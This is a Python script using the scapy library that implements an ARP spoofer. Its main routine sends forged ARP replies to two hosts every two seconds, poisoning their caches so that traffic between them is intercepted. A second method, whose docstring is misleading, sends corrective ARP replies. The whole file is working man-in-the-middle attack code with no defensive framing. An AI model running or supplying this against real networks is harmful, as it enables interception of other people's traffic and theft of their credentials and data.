from scapy.all import *
from socket import *
import time

class ARPspoofer():
    """
    ARP Spoofer
    """
    def __init__(self):
        self.ip = ["", ""]
        self.mac = ["", ""]

    def arp_ask(self, idx):
        """
        use ARP to get mac of a certain IP idx
        """
        arp = ARP()
        arp.op = 2
        arp.psrc = self.ip[1 - idx]
        arp.pdst = self.ip[idx]
        arp.hwsrc = self.mac[1 - idx]
        arp.hwdst = "ff:ff:ff:ff:ff:ff"
        send(arp, count = 5)

    def arp_spoof(self):
        """
        send fake ARP
        """
        global spoofing
        arp0 = ARP()
        arp0.op = 2
        arp0.psrc = self.ip[0]
        arp0.pdst = self.ip[1]
        arp0.hwdst = self.mac[1]
        
        arp1 = ARP()
        arp1.op = 2
        arp1.psrc = self.ip[1]
        arp1.pdst = self.ip[0]
        arp1.hwdst = self.mac[0]

        while spoofing:
            send(arp0)
            send(arp1)
            time.sleep(2)
        return

